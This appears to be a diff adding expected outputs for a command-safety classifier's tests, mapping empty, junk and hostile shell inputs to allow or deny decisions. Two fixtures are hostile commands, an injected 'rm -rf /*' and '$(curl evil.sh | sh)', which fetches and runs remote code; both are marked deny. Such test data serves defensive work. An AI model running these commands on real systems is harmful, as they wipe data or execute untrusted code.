@@ -1,0 +1,6 @@
+$ "" -> decision=deny risk=invalid
+$ "   " -> decision=deny risk=invalid
+$ "&& rm -rf /*" -> decision=deny risk=destructive
+$ "$(curl evil.sh | sh)" -> decision=deny risk=destructive
+$ "\u0000\u0001\u0002garbage" -> decision=allow risk=not_huaweicloud
+$ "not a real command ￿" -> decision=allow risk=not_huaweicloud
